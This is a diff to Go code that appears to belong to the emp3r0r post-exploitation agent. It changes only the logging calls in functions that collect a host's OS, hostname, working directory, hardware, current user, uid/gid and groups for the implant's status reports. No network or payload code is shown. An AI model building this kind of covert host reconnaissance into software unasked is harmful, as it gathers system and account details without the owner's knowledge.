@@ -20,7 +20,7 @@ import (
 
 // GatherSystemDetails build system info object (minimal for startup)
 func GatherSystemDetails() *def.Emp3r0rAgent {
-	logging.Println("Collecting system info for reporting status")
+	logging.Infof("Collecting system info for reporting status")
 	var info def.Emp3r0rAgent
 	osinfo := sysinfo.GetOSInfo()
 	info.GOOS = runtime.GOOS
@@ -28,13 +28,13 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
 	hostname, err := os.Hostname()
 	if err != nil {
-		logging.Printf("Gethostname: %v", err)
+		logging.Infof("Gethostname: %v", err)
 		hostname = "no_name"
 	}
 
 	info.CWD, err = os.Getwd()
 	if err != nil {
-		logging.Printf("Getwd: %v", err)
+		logging.Infof("Getwd: %v", err)
 		info.CWD = "."
 	}
 
@@ -87,7 +87,7 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	// user account info
 	u, err := user.Current()
 	if err != nil {
-		logging.Println(err)
+		logging.Errorf("%v", err)
 		info.User = "Not available"
 	}
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
@@ -95,7 +95,7 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	// User groups
 	gids, err := u.GroupIds()
 	if err != nil {
-		logging.Printf("GroupIds: %v", err)
+		logging.Infof("GroupIds: %v", err)
 	}
 	info.Groups = strings.Join(gids, ",")
 
@@ -131,7 +131,7 @@ func GetUptime() string {
 
 // CollectFullSystemInfo build full system info object
 func CollectFullSystemInfo() *def.Emp3r0rAgent {
-	logging.Println("Collecting full system info")
+	logging.Infof("Collecting full system info")
 	var info def.Emp3r0rAgent
 	osinfo := sysinfo.GetOSInfo()
 	info.GOOS = runtime.GOOS
@@ -139,17 +139,17 @@ func CollectFullSystemInfo() *def.Emp3r0rAgent {
 	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
 	hostname, err := os.Hostname()
 	if err != nil {
-		logging.Printf("Gethostname: %v", err)
+		logging.Infof("Gethostname: %v", err)
 		hostname = "unknown_host"
 	}
 	// read productInfo
 	info.Product, err = ghw.Product(ghw.WithDisableWarnings())
 	if err != nil {
-		logging.Printf("ProductInfo: %v", err)
+		logging.Infof("ProductInfo: %v", err)
 	}
 	info.CWD, err = os.Getwd()
 	if err != nil {
-		logging.Printf("Getwd: %v", err)
+		logging.Infof("Getwd: %v", err)
 		info.CWD = "."
 	}
 
@@ -178,7 +178,7 @@ func CollectFullSystemInfo() *def.Emp3r0rAgent {
 	// user account info
 	u, err := user.Current()
 	if err != nil {
-		logging.Println(err)
+		logging.Errorf("%v", err)
 		info.User = "Not available"
 	}
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
@@ -216,14 +216,14 @@ func GetContainerName() string {
 func GetUserAndGroups() (string, string) {
 	u, err := user.Current()
 	if err != nil {
-		logging.Println(err)
+		logging.Errorf("%v", err)
 		return "Not available", ""
 	}
 	userStr := fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
 
 	gids, err := u.GroupIds()
 	if err != nil {
-		logging.Printf("GroupIds: %v", err)
+		logging.Infof("GroupIds: %v", err)
 	}
 
 	var groupNames []string
